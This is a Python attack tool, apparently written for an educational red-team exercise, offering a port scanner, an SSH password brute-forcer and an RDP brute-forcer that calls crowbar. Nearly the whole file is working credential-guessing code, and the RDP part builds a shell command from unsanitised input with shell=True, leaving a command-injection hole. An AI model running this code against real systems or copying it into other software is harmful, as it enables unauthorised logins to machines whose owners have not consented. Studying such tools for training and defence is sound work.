#!/usr/bin/env python3

# Script Name:                  Binary Bandits 01 Attack Tool
# Author:                       David Prutch
# Date of latest revision:      09/13/2023
# Purpose:                      Penetration test tool designed for red team use in a controlled environment.

##### Warning #####
# Do not use this outside of a controlled environment.
# This script was used in an educational penetration test practice.

# This is a heavily modified and enhanced script taken from a previous script I authored.
# Original can be found here: https://github.com/Digi-Guard/Scripts/blob/main/DigiGuard_test_tool.py

# This is designed to be run on Kali Linux with Python installed.
# This script requires crowbar to be downloaded and installed from https://github.com/galkan/crowbar 
# Installation and use instructions are included on the site.

# Import Libraries
from fabric import Connection
from paramiko import AuthenticationException
import socket
import time
import subprocess

# Define Functions

# Function for Port Scanning
def port_scan():
    target_host = input("Enter the target host IP address: ")
    port_option = input("Choose an option:\n1. Selected ports (comma-separated)\n2. Port range (e.g., 80-100)\nEnter the option (1 or 2): ")

    if port_option == '1':
        # If the user chooses to specify selected ports
        target_ports = input("Enter the target ports (comma-separated): ").split(',')
    elif port_option == '2':
        # If the user chooses to specify a port range
        port_range = input("Enter the port range (e.g., 80-100): ").split('-')
        if len(port_range) == 2:
            start_port, end_port = map(int, port_range)
            target_ports = [str(port) for port in range(start_port, end_port + 1)]
        else:
            print("Invalid port range format. Please use the format 'start_port-end_port'.")
            return
    else:
        print("Invalid option. Please choose either 1 or 2.")
        return

    open_ports = []
    for port in target_ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                result = s.connect_ex((target_host, int(port)))
                if result == 0:
                    open_ports.append(port)
        except Exception as e:
            pass

    if open_ports:
        print(f"Open ports on {target_host}: {', '.join(open_ports)}")
    else:
        print("No open ports found.")

# Function for SSH Brute Force using fabric
def ssh_brute_force():
    # Prompt user for SSH server IP address
    ssh_ip = input("Enter the SSH server IP address: ")

    # Prompt user for the word list file path
    word_list_path = input("Enter the word list file path: ")
    # Read the word list from the file
    with open(word_list_path, 'r') as word_file:
        words = word_file.read().splitlines()

    # Prompt user to choose between a known username or a usernames file
    option = input("Choose an option:\n1. Known username\n2. List of usernames\nEnter the option (1 or 2): ")

    if option == '1':
        # If the user chooses a known username
        username = input("Enter the SSH username: ")
        try:
            for word in words:
                word = word.strip()
                with Connection(host=ssh_ip, user=username, connect_kwargs={"password": word}) as conn:
                    result = conn.run("echo 'Successful SSH login.'", hide=True)
                    if result.ok:
                        print(f"SSH Login successful! Username: {username}, Password: {word}")
                        break
        except AuthenticationException:
            print(f"SSH Login failed for Username: {username}, Password: {word}")

    elif option == '2':
        # If the user chooses to provide a list of usernames
        usernames_file_path = input("Enter the usernames file path: ")
        # Read the usernames from the file
        with open(usernames_file_path, 'r') as user_file:
            usernames = user_file.read().splitlines()

        for username in usernames:
            username = username.strip()
            for word in words:
                word = word.strip()
                try:
                    with Connection(host=ssh_ip, user=username, connect_kwargs={"password": word}) as conn:
                        result = conn.run("echo 'Successful SSH login.'", hide=True)
                        if result.ok:
                            print(f"SSH Login successful! Username: {username}, Password: {word}")
                            break
                except AuthenticationException:
                    print(f"SSH Login failed for Username: {username}, Password: {word}")

    else:
        print("Invalid option. Please choose either 1 or 2.")

# Function for RDP Brute Force
def rdp_brute_force():
    # Prompt user for the RDP server IP address
    # This requires CIDR notation 
    # To test a subnet use the actual subnet example: /24
    # to test a single IP address use /32
    rdp_ip = input("Enter the RDP server IP address: ")

    # Prompt user to choose between a known username or a usernames file
    option = input("Choose an option:\n1. Known username\n2. List of usernames\nEnter the option (1 or 2): ")

    if option == '1':
        # If the user chooses a known username
        known_username = input("Enter the known username: ")

        # Prompt user for the word list file path
        word_list_path = input("Enter the word list file path: ")

        try:
            # Build the crowbar command with the provided parameters
            crowbar_cmd = f'/usr/bin/crowbar -b rdp -s {rdp_ip} -u {known_username} -C {word_list_path}'

            # Run crowbar in the command prompt
            process = subprocess.Popen(crowbar_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

            # Wait for the process to complete
            stdout, stderr = process.communicate()

            # Print the output of crowbar
            print(stdout.decode())
            print(stderr.decode())

            # Check the process return code to determine if the brute force completed
            if process.returncode == 0:
                print("RDP brute force completed successfully.")
            else:
                print("RDP brute force failed.")

        except Exception as e:
            print(f"Error: {e}")

    elif option == '2':
        # If the user chooses to provide a list of usernames
        usernames_file_path = input("Enter the usernames file path: ")
        # Prompt user for the word list file path
        word_list_path = input("Enter the word list file path: ")

        try:
            # Build the crowbar command with the provided parameters
            crowbar_cmd = f'/usr/bin/crowbar -b rdp -s {rdp_ip} -U {usernames_file_path} -C {word_list_path}'

            # Run crowbar in the command prompt
            process = subprocess.Popen(crowbar_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

            # Wait for the process to complete
            stdout, stderr = process.communicate()

            # Print the output of crowbar
            print(stdout.decode())
            print(stderr.decode())

            # Check the process return code to determine if the brute force completed
            if process.returncode == 0:
                print("RDP brute force completed successfully.")
            else:
                print("RDP brute force failed.")

        except Exception as e:
            print(f"Error: {e}")

    else:
        print("Invalid option. Please choose either 1 or 2.")

# Main
while True:
    print("Choose a mode:")
    print("1. Port Scan")
    print("2. SSH Brute Force")
    print("3. RDP Brute Force")
    print("4. Exit")

    # Read the chosen mode number
    mode = int(input("Enter mode number: "))

    if mode == 1:
        # Call port_scan function
        port_scan()
    elif mode == 2:
        # Call ssh_brute_force function
        ssh_brute_force()
    elif mode == 3:
        # Call rdp_brute_force function
        rdp_brute_force()
    elif mode == 4:
        # Exit the loop
        break
    else:
        # Print an error message if an invalid mode number is entered
        print("Invalid mode number. Please try again.")